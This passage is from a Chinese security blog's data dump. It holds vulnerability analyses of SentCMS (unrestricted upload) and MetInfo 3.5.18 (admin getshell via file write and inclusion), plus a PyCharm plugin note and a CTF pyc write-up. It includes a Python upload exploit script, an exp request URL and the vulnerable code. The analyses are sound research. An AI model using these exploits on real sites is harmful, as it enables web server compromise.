plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">diff -r dir1 dir2</span><br></pre></td></tr></table></figure></p>\n<p>也可以选择使用一些你喜欢的文件对比工具</p>\n<h3 id=\"最重要的一步-查看代码\"><a href=\"#最重要的一步-查看代码\" class=\"headerlink\" title=\"最重要的一步 查看代码\"></a>最重要的一步 查看代码</h3><p>提交行数不多 快速查看 发现疑似漏洞点<br><img src=\"https://box.kancloud.cn/768d4ed85832725fdc7aea45e2699dfa_759x514.png\" alt=\"\"><br>可以看到对文件校验是这个提交才添加的 我们查看旧版本并下载 <a href=\"https://gitee.com/sentcms/sentcms/blob/341877cfb8672eed52fdc332650ee8b7ee297946/application/common/controller/Upload.php\" target=\"_blank\" rel=\"noopener\">地址</a></p>\n<p> 这个时候阅读一下readme 可以看到<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">│ ├─common             COMMON公共模型，不可访问</span><br><span class=\"line\">│ │ ├─controller      公共基类目录</span><br><span class=\"line\">│ │ ├─model           模型目录</span><br><span class=\"line\">│ │ ├─validate        验证配置</span><br><span class=\"line\">│ │ ├─view            公共模板目录</span><br><span class=\"line\">│ │ ├─widget          扩展组件目录</span><br></pre></td></tr></table></figure></p>\n<p>很明显我们不能直接访问 需要通过调用<br>这个时候Ide就能帮助我们快速找到调用</p>\n<p>我们在ide搜索可以找到<code>application/admin/controller/Upload.php</code> 没有进行任何过滤的调用了<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">namespace app\\admin\\controller;</span><br><span class=\"line\">use app\\common\\controller\\Admin;</span><br><span class=\"line\"></span><br><span class=\"line\">class Upload extends Admin &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpublic function _empty() &#123;</span><br><span class=\"line\">\t\t$controller = controller(&apos;common/Upload&apos;);</span><br><span class=\"line\">\t\t$action     = $this-&gt;request-&gt;action();</span><br><span class=\"line\">\t\treturn $controller-&gt;$action();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"https://gitee.com/sentcms/sentcms/blob/341877cfb8672eed52fdc332650ee8b7ee297946/application/admin/controller/Upload.php\" target=\"_blank\" rel=\"noopener\">web地址</a></p>\n<p>这个cms使用了tp5框架 需要通过路由访问<br>我们访问<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sentcms/admin/Upload/Upload</span><br></pre></td></tr></table></figure></p>\n<p>从报错信息可以看到已经执行到了漏洞语句位置<br>由代码可知 直接上传文件即可</p>\n<h3 id=\"python编写exp\"><a href=\"#python编写exp\" class=\"headerlink\" title=\"python编写exp\"></a>python编写exp</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">url = &apos;http://127.0.0.1/sentcms/admin/Upload/Upload&apos;</span><br><span class=\"line\">files = &#123;&apos;phpinfo.php&apos;: open(&apos;phpinfo.txt&apos;,&apos;rb&apos;)&#125;</span><br><span class=\"line\"># 我本地cookeie</span><br><span class=\"line\">cookie = &#123;&apos; remember_token&apos;:&apos;1|8b6075452c23faa1eba56fe61b89df391811d155e7578a40114732131c49d01341d8a7e30460891e6525292631bfa038a97e3d1d9f1290b345c60a6ac0ea1484&apos;,&apos;PHPSESSID&apos;:&apos;d4ubb72j0d9evlbktqqqct6ci2;&apos;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">r = requests.post(url, files=file，cookies=cookie)</span><br></pre></td></tr></table></figure>\n<p>我们可以在<code>uploads\\picture\\20180521</code>找到一个，以微秒时间的md5编码为文件名的php文件</p>\n"},{"title":"pycharm插件","date":"2018-06-12T11:03:38.000Z","_content":"## pycharm插件使用\n打开`file->setting->plugins` 是pycharm的插件界面了 自带的插件比较多 包括了`git`,`ssh`,`javascript`,`css`等\n\npycharm也提供了从官方存储库下载的功能，只需点击`install jetbrain plugins`. 从磁盘下载则是`install plugins for disk`\n\n## 常用插件推荐\n`.ignore` 版本控制库忽略提交文件 如`git`的`.gitignore` 插件\n\n`markdown support` markdown插件\n\n` Material Theme ui` pycharm主题 非常好看\n\n`ideavim`  vim操作支持\n`statistic`  统计项目行数\n\n\n","source":"_posts/pycharm.md","raw":"---\ntitle: pycharm插件\ndate: 2018-06-12 19:03:38\ntags:\n    编程开发\n---\n## pycharm插件使用\n打开`file->setting->plugins` 是pycharm的插件界面了 自带的插件比较多 包括了`git`,`ssh`,`javascript`,`css`等\n\npycharm也提供了从官方存储库下载的功能，只需点击`install jetbrain plugins`. 从磁盘下载则是`install plugins for disk`\n\n## 常用插件推荐\n`.ignore` 版本控制库忽略提交文件 如`git`的`.gitignore` 插件\n\n`markdown support` markdown插件\n\n` Material Theme ui` pycharm主题 非常好看\n\n`ideavim`  vim操作支持\n`statistic`  统计项目行数\n\n\n","slug":"pycharm","published":1,"updated":"2018-06-16T14:50:38.868Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkk0wi3v000ar4nxwu3umwg2","content":"<h2 id=\"pycharm插件使用\"><a href=\"#pycharm插件使用\" class=\"headerlink\" title=\"pycharm插件使用\"></a>pycharm插件使用</h2><p>打开<code>file-&gt;setting-&gt;plugins</code> 是pycharm的插件界面了 自带的插件比较多 包括了<code>git</code>,<code>ssh</code>,<code>javascript</code>,<code>css</code>等</p>\n<p>pycharm也提供了从官方存储库下载的功能，只需点击<code>install jetbrain plugins</code>. 从磁盘下载则是<code>install plugins for disk</code></p>\n<h2 id=\"常用插件推荐\"><a href=\"#常用插件推荐\" class=\"headerlink\" title=\"常用插件推荐\"></a>常用插件推荐</h2><p><code>.ignore</code> 版本控制库忽略提交文件 如<code>git</code>的<code>.gitignore</code> 插件</p>\n<p><code>markdown support</code> markdown插件</p>\n<p><code>Material Theme ui</code> pycharm主题 非常好看</p>\n<p><code>ideavim</code>  vim操作支持<br><code>statistic</code>  统计项目行数</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"pycharm插件使用\"><a href=\"#pycharm插件使用\" class=\"headerlink\" title=\"pycharm插件使用\"></a>pycharm插件使用</h2><p>打开<code>file-&gt;setting-&gt;plugins</code> 是pycharm的插件界面了 自带的插件比较多 包括了<code>git</code>,<code>ssh</code>,<code>javascript</code>,<code>css</code>等</p>\n<p>pycharm也提供了从官方存储库下载的功能，只需点击<code>install jetbrain plugins</code>. 从磁盘下载则是<code>install plugins for disk</code></p>\n<h2 id=\"常用插件推荐\"><a href=\"#常用插件推荐\" class=\"headerlink\" title=\"常用插件推荐\"></a>常用插件推荐</h2><p><code>.ignore</code> 版本控制库忽略提交文件 如<code>git</code>的<code>.gitignore</code> 插件</p>\n<p><code>markdown support</code> markdown插件</p>\n<p><code>Material Theme ui</code> pycharm主题 非常好看</p>\n<p><code>ideavim</code>  vim操作支持<br><code>statistic</code>  统计项目行数</p>\n"},{"title":"metinfo3.5.18后台getshell分析","date":"2017-11-25T01:27:13.000Z","_content":"此漏洞已经在最新版修复\n### exp\n ` /admin/app/physical/physical.php?action=op&op=3&valphy=test|文件名&address=包含文件`\n \n### 代码分析\n查看关键代码\n```php\ncase 3:\n\t\t\t$fileaddr=explode('/',$val[1]);\n\t\t\t$filedir=\"../../../\".$fileaddr[0];  \n\t\t\tif(!file_exists($filedir)){ @mkdir ($filedir, 0777); } \n\t\t\tif($fileaddr[1]==\"index.php\"){\n\t\t\t\tif($val[2]){\n\t\t\t\t\tCopyindx(\"../../../\".$val[1],$val[2]);\n\t\t\t\t}\n\t\t\t}else{\n\t\t\t// 漏洞点\n\t\t\tswitch($val[2]){\n\t\t\t\tcase 1:\n\t\t\t\t\t$address=\"../about/$fileaddr[1]\";\n\t\t\t\tbreak;\n\t\t\t\tcase 2:\n\t\t\t\t\t$address=\"../news/$fileaddr[1]\";\n\t\t\t\tbreak;\n\t\t\t\tcase 3:\n\t\t\t\t\t$address=\"../product/$fileaddr[1]\";\n\t\t\t\tbreak;\n\t\t\t\tcase 4:\n\t\t\t\t\t$address=\"../download/$fileaddr[1]\";\n\t\t\t\tbreak;\n\t\t\t\tcase 5:\n\t\t\t\t\t$address=\"../img/$fileaddr[1]\";\n\t\t\t\tbreak;\n\t\t\t\tcase 8:\n\t\t\t\t\t$address=\"../feedback/$fileaddr[1]\";\n\t\t\t\tbreak;\n\t\t\t\n\n\t\t\t}   \n\t\t\t\t$newfile  =\"../../../$val[1]\"; \n\t\t\t\t\n\t\t\t\tCopyfile($address,$newfile);\n\t\t\t\t\n\t\t\t}\n\t\t\techo $lang_physicalgenok;\n\t\t\tbreak;\n```\n我们可以看到我们可控参数`$address`和`newfile`传入了`Copyfile`\n主要是程序员写代码的时候忽略了异常参数导致address参数没有被覆盖,应该添加不是正常参数时不执行`Copyfile`\n\n查看`Copyfile`函数\n```php\nfunction Copyfile($address,$newfile){\n\t$oldcont  = \"<?php\\n# MetInfo Enterprise Content Management System \\n# Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. \\nrequire_once '$address';\\n# This program is an open source system, commercial use, please consciously to purchase commercial license.\\n# Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.\\n?>\";\n\tif(!file_exists($newfile)){\n\t\t$fp = fopen($newfile,w);\n\t\tfputs($fp, $oldcont);\n\t\tfclose($fp);\n\t}\n}\n```\n此函数可以创建并写入文件\n可以看到此函数我们可以控制文件名,不过单引号导致我们只能控制require_once参数.\n不过也造成了文件包含漏洞,上传一个php代码头像,即可getshell\n\n\n查看最新版本修复方法\n```php\n\tdefault:\n\t\t $address = \"\";\n\tbreak;\n```\n添加了不是正常参数时候默认为空\n","source":"_posts/metinfoexp.md","raw":"---\ntitle: metinfo3.5.18后台getshell分析\ndate: 2017-11-25 09:27:13\ntags:\n\t web安全\n     漏洞分析\n---\n此漏洞已经在最新版修复\n### exp\n ` /admin/app/physical/physical.php?action=op&op=3&valphy=test|文件名&address=包含文件`\n \n### 代码分析\n查看关键代码\n```php\ncase 3:\n\t\t\t$fileaddr=explode('/',$val[1]);\n\t\t\t$filedir=\"../../../\".$fileaddr[0];  \n\t\t\tif(!file_exists($filedir)){ @mkdir ($filedir, 0777); } \n\t\t\tif($fileaddr[1]==\"index.php\"){\n\t\t\t\tif($val[2]){\n\t\t\t\t\tCopyindx(\"../../../\".$val[1],$val[2]);\n\t\t\t\t}\n\t\t\t}else{\n\t\t\t// 漏洞点\n\t\t\tswitch($val[2]){\n\t\t\t\tcase 1:\n\t\t\t\t\t$address=\"../about/$fileaddr[1]\";\n\t\t\t\tbreak;\n\t\t\t\tcase 2:\n\t\t\t\t\t$address=\"../news/$fileaddr[1]\";\n\t\t\t\tbreak;\n\t\t\t\tcase 3:\n\t\t\t\t\t$address=\"../product/$fileaddr[1]\";\n\t\t\t\tbreak;\n\t\t\t\tcase 4:\n\t\t\t\t\t$address=\"../download/$fileaddr[1]\";\n\t\t\t\tbreak;\n\t\t\t\tcase 5:\n\t\t\t\t\t$address=\"../img/$fileaddr[1]\";\n\t\t\t\tbreak;\n\t\t\t\tcase 8:\n\t\t\t\t\t$address=\"../feedback/$fileaddr[1]\";\n\t\t\t\tbreak;\n\t\t\t\n\n\t\t\t}   \n\t\t\t\t$newfile  =\"../../../$val[1]\"; \n\t\t\t\t\n\t\t\t\tCopyfile($address,$newfile);\n\t\t\t\t\n\t\t\t}\n\t\t\techo $lang_physicalgenok;\n\t\t\tbreak;\n```\n我们可以看到我们可控参数`$address`和`newfile`传入了`Copyfile`\n主要是程序员写代码的时候忽略了异常参数导致address参数没有被覆盖,应该添加不是正常参数时不执行`Copyfile`\n\n查看`Copyfile`函数\n```php\nfunction Copyfile($address,$newfile){\n\t$oldcont  = \"<?php\\n# MetInfo Enterprise Content Management System \\n# Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. \\nrequire_once '$address';\\n# This program is an open source system, commercial use, please consciously to purchase commercial license.\\n# Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.\\n?>\";\n\tif(!file_exists($newfile)){\n\t\t$fp = fopen($newfile,w);\n\t\tfputs($fp, $oldcont);\n\t\tfclose($fp);\n\t}\n}\n```\n此函数可以创建并写入文件\n可以看到此函数我们可以控制文件名,不过单引号导致我们只能控制require_once参数.\n不过也造成了文件包含漏洞,上传一个php代码头像,即可getshell\n\n\n查看最新版本修复方法\n```php\n\tdefault:\n\t\t $address = \"\";\n\tbreak;\n```\n添加了不是正常参数时候默认为空\n","slug":"metinfoexp","published":1,"updated":"2018-05-31T01:36:05.995Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkk0wi4f000cr4nx4oj4q81m","content":"<p>此漏洞已经在最新版修复</p>\n<h3 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h3><p> <code>/admin/app/physical/physical.php?action=op&amp;op=3&amp;valphy=test|文件名&amp;address=包含文件</code></p>\n<h3 id=\"代码分析\"><a href=\"#代码分析\" class=\"headerlink\" title=\"代码分析\"></a>代码分析</h3><p>查看关键代码<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">case</span> <span class=\"number\">3</span>:</span><br><span class=\"line\">\t\t\t$fileaddr=explode(<span class=\"string\">'/'</span>,$val[<span class=\"number\">1</span>]);</span><br><span class=\"line\">\t\t\t$filedir=<span class=\"string\">\"../../../\"</span>.$fileaddr[<span class=\"number\">0</span>];  </span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(!file_exists($filedir))&#123; @mkdir ($filedir, <span class=\"number\">0777</span>); &#125; </span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>($fileaddr[<span class=\"number\">1</span>]==<span class=\"string\">\"index.php\"</span>)&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span>($val[<span class=\"number\">2</span>])&#123;</span><br><span class=\"line\">\t\t\t\t\tCopyindx(<span class=\"string\">\"../../../\"</span>.$val[<span class=\"number\">1</span>],$val[<span class=\"number\">2</span>]);</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">// 漏洞点</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">switch</span>($val[<span class=\"number\">2</span>])&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">case</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">\t\t\t\t\t$address=<span class=\"string\">\"../about/$fileaddr[1]\"</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">case</span> <span class=\"number\">2</span>:</span><br><span class=\"line\">\t\t\t\t\t$address=<span class=\"string\">\"../news/$fileaddr[1]\"</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">case</span> <span class=\"number\">3</span>:</span><br><span class=\"line\">\t\t\t\t\t$address=<span class=\"string\">\"../product/$fileaddr[1]\"</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">case</span> <span class=\"number\">4</span>:</span><br><span class=\"line\">\t\t\t\t\t$address=<span class=\"string\">\"../download/$fileaddr[1]\"</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">case</span> <span class=\"number\">5</span>:</span><br><span class=\"line\">\t\t\t\t\t$address=<span class=\"string\">\"../img/$fileaddr[1]\"</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">case</span> <span class=\"number\">8</span>:</span><br><span class=\"line\">\t\t\t\t\t$address=<span class=\"string\">\"../feedback/$fileaddr[1]\"</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t&#125;   </span><br><span class=\"line\">\t\t\t\t$newfile  =<span class=\"string\">\"../../../$val[1]\"</span>; </span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">\t\t\t\tCopyfile($address,$newfile);</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">echo</span> $lang_physicalgenok;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br></pre></td></tr></table></figure></p>\n<p>我们可以看到我们可控参数<code>$address</code>和<code>newfile</code>传入了<code>Copyfile</code><br>主要是程序员写代码的时候忽略了异常参数导致address参数没有被覆盖,应该添加不是正常参数时不执行<code>Copyfile</code></p>\n<p>查看<code>Copyfile</code>函数<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Copyfile</span><span class=\"params\">($address,$newfile)</span></span>&#123;</span><br><span class=\"line\">\t$oldcont  = <span class=\"string\">\"&lt;?php\\n# MetInfo Enterprise Content Management System \\n# Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. \\nrequire_once '$address';\\n# This program is an open source system, commercial use, please consciously to purchase commercial license.\\n# Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.\\n?&gt;\"</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(!file_exists($newfile))&#123;</span><br><span class=\"line\">\t\t$fp = fopen($newfile,w);</span><br><span class=\"line\">\t\tfputs($fp, $oldcont);</span><br><span class=\"line\">\t\tfclose($fp);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>此函数可以创建并写入文件<br>可以看到此函数我们可以控制文件名,不过单引号导致我们只能控制require_once参数.<br>不过也造成了文件包含漏洞,上传一个php代码头像,即可getshell</p>\n<p>查看最新版本修复方法<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">default</span>:</span><br><span class=\"line\">\t $address = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">break</span>;</span><br></pre></td></tr></table></figure></p>\n<p>添加了不是正常参数时候默认为空</p>\n","site":{"data":{}},"excerpt":"","more":"<p>此漏洞已经在最新版修复</p>\n<h3 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h3><p> <code>/admin/app/physical/physical.php?action=op&amp;op=3&amp;valphy=test|文件名&amp;address=包含文件</code></p>\n<h3 id=\"代码分析\"><a href=\"#代码分析\" class=\"headerlink\" title=\"代码分析\"></a>代码分析</h3><p>查看关键代码<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">case</span> <span class=\"number\">3</span>:</span><br><span class=\"line\">\t\t\t$fileaddr=explode(<span class=\"string\">'/'</span>,$val[<span class=\"number\">1</span>]);</span><br><span class=\"line\">\t\t\t$filedir=<span class=\"string\">\"../../../\"</span>.$fileaddr[<span class=\"number\">0</span>];  </span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(!file_exists($filedir))&#123; @mkdir ($filedir, <span class=\"number\">0777</span>); &#125; </span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>($fileaddr[<span class=\"number\">1</span>]==<span class=\"string\">\"index.php\"</span>)&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span>($val[<span class=\"number\">2</span>])&#123;</span><br><span class=\"line\">\t\t\t\t\tCopyindx(<span class=\"string\">\"../../../\"</span>.$val[<span class=\"number\">1</span>],$val[<span class=\"number\">2</span>]);</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">// 漏洞点</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">switch</span>($val[<span class=\"number\">2</span>])&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">case</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">\t\t\t\t\t$address=<span class=\"string\">\"../about/$fileaddr[1]\"</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">case</span> <span class=\"number\">2</span>:</span><br><span class=\"line\">\t\t\t\t\t$address=<span class=\"string\">\"../news/$fileaddr[1]\"</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">case</span> <span class=\"number\">3</span>:</span><br><span class=\"line\">\t\t\t\t\t$address=<span class=\"string\">\"../product/$fileaddr[1]\"</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">case</span> <span class=\"number\">4</span>:</span><br><span class=\"line\">\t\t\t\t\t$address=<span class=\"string\">\"../download/$fileaddr[1]\"</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">case</span> <span class=\"number\">5</span>:</span><br><span class=\"line\">\t\t\t\t\t$address=<span class=\"string\">\"../img/$fileaddr[1]\"</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">case</span> <span class=\"number\">8</span>:</span><br><span class=\"line\">\t\t\t\t\t$address=<span class=\"string\">\"../feedback/$fileaddr[1]\"</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t&#125;   </span><br><span class=\"line\">\t\t\t\t$newfile  =<span class=\"string\">\"../../../$val[1]\"</span>; </span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">\t\t\t\tCopyfile($address,$newfile);</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">echo</span> $lang_physicalgenok;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br></pre></td></tr></table></figure></p>\n<p>我们可以看到我们可控参数<code>$address</code>和<code>newfile</code>传入了<code>Copyfile</code><br>主要是程序员写代码的时候忽略了异常参数导致address参数没有被覆盖,应该添加不是正常参数时不执行<code>Copyfile</code></p>\n<p>查看<code>Copyfile</code>函数<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Copyfile</span><span class=\"params\">($address,$newfile)</span></span>&#123;</span><br><span class=\"line\">\t$oldcont  = <span class=\"string\">\"&lt;?php\\n# MetInfo Enterprise Content Management System \\n# Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. \\nrequire_once '$address';\\n# This program is an open source system, commercial use, please consciously to purchase commercial license.\\n# Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.\\n?&gt;\"</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(!file_exists($newfile))&#123;</span><br><span class=\"line\">\t\t$fp = fopen($newfile,w);</span><br><span class=\"line\">\t\tfputs($fp, $oldcont);</span><br><span class=\"line\">\t\tfclose($fp);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>此函数可以创建并写入文件<br>可以看到此函数我们可以控制文件名,不过单引号导致我们只能控制require_once参数.<br>不过也造成了文件包含漏洞,上传一个php代码头像,即可getshell</p>\n<p>查看最新版本修复方法<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">default</span>:</span><br><span class=\"line\">\t $address = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">break</span>;</span><br></pre></td></tr></table></figure></p>\n<p>添加了不是正常参数时候默认为空</p>\n"},{"title":"i春秋61挑战 wp","date":"2018-06-04T16:51:34.000Z","_content":"在i春秋 [61挑战](https://bbs.ichunqiu.com/thread-41125-1-1.html)出了道简单的签到题\n题目是一个损坏的pyc文件\n\n\n## wp\n首先生成一个正常pyc文件  `python -m py_compile $filename ` 对比如下\n![winhex](/images/winhex_pyc.png)\n\n可以发现文件头被破坏 对照正常pyc文件修复. 然后使用工具对pyc进行反编译 比如 https://tool.lu/pyc/ \n\n得到反编译代码\n```\n_ = (lambda .0: continue[ chr(i ^ 51) for i in .0 ])((85, 95, 82, 84, 72, 67, 74, 80, 74, 86, 64, 91, 90, 67, 74, 78))\n```\n\n打印 `_` 得到flag `flag{pycyeshipy}` \n\n\n题目很简单 但是不知道为什么只有两位表哥做出来\n","source":"_posts/newpost.md","raw":"---\ntitle: i春秋61挑战 wp\ndate: 2018-06-05 00:51:34\ntags:\n    编程技术\n---\n在i春秋 [61挑战](https://bbs.ichunqiu.com/thread-41125-1-1.html)出了道简单的签到题\n题目是一个损坏的pyc文件\n\n\n## wp\n首先生成一个正常pyc文件  `python -m py_compile $filename ` 对比如下\n![winhex](/images/winhex_pyc.png)\n\n可以发现文件头被破坏 对照正常pyc文件修复. 然后使用工具对pyc进行反编译 比如 https://tool.lu/pyc/ \n\n得到反编译代码\n```\n_ = (lambda .0: continue[ chr(i ^ 51) for i in .0 ])((85, 95, 82, 84, 72, 67, 74, 80, 74, 86, 64, 91, 90, 67, 74, 78))\n```\n\n打印 `_` 得到flag 